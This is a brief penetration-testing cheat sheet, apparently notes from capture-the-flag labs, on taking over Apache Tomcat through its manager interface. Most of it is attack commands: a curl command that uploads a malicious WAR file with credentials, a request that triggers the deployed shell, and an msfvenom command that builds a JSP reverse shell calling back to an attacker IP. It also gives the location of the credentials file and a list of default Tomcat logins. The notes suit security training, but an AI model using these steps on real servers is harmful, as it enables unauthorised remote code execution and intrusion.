https://book.hacktricks.xyz/pentesting/pentesting-web/tomcat#rce
https://book.hacktricks.xyz/pentesting/pentesting-web/tomcat#limitations


Deploy malicious payload Using text based interface:
``/manager/text/list``

Upload using curl:
```bash
curl -u 'tomcat:$3cureP4s5w0rd123!' http://10.10.10.194:8080/manager/text/deploy?path=/0xdf --upload-file rev.10.10.14.18-443.war

curl http://10.10.10.95:8080/shell1/
```

Credentials Location:
`/usr/share/tomcat9/etc/tomcat-users.xml`

**Reverse Shell:**
```bash
msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.5 LPORT=80 -f war > shell.war
```

**Default Credetials:**
_tomcat:s3cret_
_tomcat:tomcat_
_tomcat:[empty]_
_admin:admin_